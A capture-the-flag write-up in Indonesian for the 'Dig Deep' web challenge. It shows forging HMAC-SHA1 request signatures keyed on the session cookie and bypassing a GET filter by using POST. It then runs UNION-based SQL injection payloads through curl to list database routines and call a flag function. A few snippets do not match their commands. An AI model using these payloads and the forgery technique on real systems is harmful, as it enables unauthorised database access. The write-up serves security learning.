## Dig Deep
### Deskripsi

Hi kak, kok [website](http://103.147.32.214:10002/) ini jelek banget ya kak.


### Solusi

setelah di-identifikasi pada source terdapat hint `REQUEST for debug` dengan mencoba mengakses halaman http://103.147.32.214:10002/index.php?id=1&signature=a2490c8f0578e52a4b36a64d3746d37112b929b5&debug=1 ternyata muncul informasi query dari data yang diambil dari database

```
select * from chal where id='1'
```

dengan mencoba memanipulasi parameter `id` menjadi `id=1'` hasilnya `Blocked Request` atau menggantinya dengan angka yang valid `id=999` hasilnya `Invalid Signature Request` artinya parameter `signature` hanya dikhususkan untuk nilai dari parameter `id=1` dengan kata lain harus mendapatkan signature yang valid untuk merubah parameter `id`

setelah diteliti parameter signature akan berubah jika cookies `PHPSESSID` berubah, misalnya

```
signature=a2490c8f0578e52a4b36a64d3746d37112b929b5 = 40 karakter
PHPSESSID=4f81531a92ed897aa42712a0489e86a3 = 32 Karakter

signature=9ee3b3112eccb57ca32aa0edf1a7b87444a59454 = 40 karakter
PHPSESSID=9npr2gu2f4pv1jl8phmefmlbcu = 26 Karakter
```

setelah beberapa kali menghapus cookies dan memperhatikan pattern yang ada, kemungkinan besar signature berubah jika cookies berubah, tetapi signature tetap 40 karaketer dimana 40 karakter umunya adalah panjang hash sha1.


jika browsing di google dengan keyword `php sha1 request signature` kebanyakan hasilnya akan merujuk pada **HMAC SHA1 Signature** 

```php
<?php 
hash_hmac('sha1', 'string', 'key', $raw_output=TRUE)
```

hasil dari `hash_hmac` berbentuk unprintable karakter, dari banyak sample banyak yang merubahnya dalam bentuk base64 atau md5 atau sha1, sehingga bentuknya menjadi

```php
<?php 
sha1(hash_hmac('sha1', 'string', 'key', $raw_output=TRUE))
md5(hash_hmac('sha1', 'string', 'key', $raw_output=TRUE))
base64_encode(hash_hmac('sha1', 'string', 'key', $raw_output=TRUE))
```

dalam kasus ini, kemungkinan adalah sha1 karena panjang signature adalah 40 karakter, berbekal informasi tersebut, hanya variable `key` yang menjadi masalah, karena pattern yang didapat ketika cookies berubah signature berubah maka asumsinya cookies adalah key-nya.

```php
$signature = sha1(hash_hmac('sha1', 999, '9npr2gu2f4pv1jl8phmefmlbcu', $raw_output=TRUE));
//ea3a5d25ae9deedfcfafa545e529df9f41d937d4
```

jika kita akses halaman website alamat 

```
http://103.147.32.214:10002/index.php?id=999&signature=ea3a5d25ae9deedfcfafa545e529df9f41d937d4&debug=1
```

hasilnya halaman muncul tanpa error dan tanpa peringatan, plus informasi debug memberikan informasi tambahan berupa query yang dijalankan

```sql
select * from chal where id='999'
```

selanjutnya tinggal menjalankan command sql-injection seperti kebanyakan, misalnya seperti

```php
$payload = "1'";
$signature = sha1(hash_hmac('sha1', $payload, '9npr2gu2f4pv1jl8phmefmlbcu', $raw_output=TRUE));
// 4c2fb3dc973fa079646339ef4575cf9cfa861c08
http://103.147.32.214:10002/index.php?id=1'&signature=4c2fb3dc973fa079646339ef4575cf9cfa861c08&debug=1
```

sayangnya hasilnya adalah `Blocked Request` artinya parameter id diberikan filter untuk mengantisipasi serangan SQL Injection, mencoba beberapa payload dan hasilnya tetap sama `Blocked Request`

setelah dipantengin lagi, ada hint tentang `REQUEST for debug` **REQUEST** bisa jadi **POST** atau **GET** karena pada php **REQUEST** bisa bersumber dari mana saja, seperti post,get,env dan yang lain, jika dicoba dengan post hasilnya

```bash
curl --location --request POST 'http://103.147.32.214:10002/index.php?debug=1' \
--header 'Cookie: PHPSESSID=9npr2gu2f4pv1jl8phmefmlbcu' \
--form 'id="1'\''"' \
--form 'signature="4c2fb3dc973fa079646339ef4575cf9cfa861c08"'
```

hasilnya tidak ada pesan `Blocked Request` dan debug menunjukan `select * from chal where id='1''` artinya dengan method **POST** tidak ada pem-filteran untuk parameter id tetapi ada validasi untuk parameter signature, dengan begitu tinggal melanjutkan injection nya dengan payload yang berbeda

```php
$payload = "1' and 1=0 union select 1,version(),3-- -";
$signature = sha1(hash_hmac('sha1', $payload, '9npr2gu2f4pv1jl8phmefmlbcu', $raw_output=TRUE));
//ccd1674a0a25b7943847b51bb7fda76ab8f5661e
```

ketika payload dikirimkan, hasilnya

```bash
curl --location --request POST 'http://103.147.32.214:10002/index.php?debug=1' \
--header 'Cookie: PHPSESSID=9npr2gu2f4pv1jl8phmefmlbcu' \
--form 'id="1'\'' and 1=0 union select 1,version(),3-- -"' \
--form 'signature="ccd1674a0a25b7943847b51bb7fda76ab8f5661e"'

....

select * from chal where id='1' and 1=0 union select 1,version(),3-- -'
...
...
...
5.7.36
....

```


setelah mengirimkan payload sql-injection untuk mencari table, database dan isinya tetap saja flag tidak ada

```bash
$payload = "1' and 1=0 union select 1,group_concat(id),3 from chal limit 1-- -";
$signature = sha1(hash_hmac('sha1', $payload, '9npr2gu2f4pv1jl8phmefmlbcu', $raw_output=TRUE));
//3ed95455ca70a8b150150f6ffddf774bee7a5cf2

curl --location --request POST 'http://103.147.32.214:10002/index.php?debug=1' \
--header 'Cookie: PHPSESSID=9npr2gu2f4pv1jl8phmefmlbcu' \
--form 'id="1'\'' and 1=0 union select 1,group_concat(desc),3 from chal limit 1-- -"' \
--form 'signature="c25a0cff580e063a3a74f2cde62af502e5b47a63"'
```

setelah mencari pada tiap kolom, hasil akhirnya tetap tidak menampilkan flag, hanya berupa informasi

```
You,Are Looking,In Wrong Place
```

sesuai judulnya, kita diminta menggali lebih dalam, dan pada akhirnya ketemunya ada dalam routine database


```bash
$payload = "1' and 1=0 union select 1,group_concat(routine_name),3 from information_schema.routines limit 1-- -";
$signature = sha1(hash_hmac('sha1', $payload, '9npr2gu2f4pv1jl8phmefmlbcu', $raw_output=TRUE));


curl --location --request POST 'http://103.147.32.214:10002/index.php?debug=1' \
--header 'Cookie: PHPSESSID=9npr2gu2f4pv1jl8phmefmlbcu' \
--form 'id="1'\'' and 1=0 union select 1,group_concat(routine_name),3 from information_schema.routines limit 1-- -"' \
--form 'signature="bd27852a1c186563e38c1ebb4976bac53e08f6dc"'
```

dan hasilnya adalah

```sql
select * from chal where id='1' and 1=0 union select 1,group_concat(routine_name),3 from information_schema.routines limit 1-- -'
...
...
...
give_me_flag
```

final step, tinggal mendapatkan flagnya

```bash
$payload1 =  "1' and 1=0 union select 1,unhex(give_me_flag()),3-- -";
$signature = sha1(hash_hmac('sha1', $payload, '9npr2gu2f4pv1jl8phmefmlbcu', $raw_output=TRUE));
// Hasilnya 
lastctf{sql1nj3ct10n_ju5t_f0r_fun}
```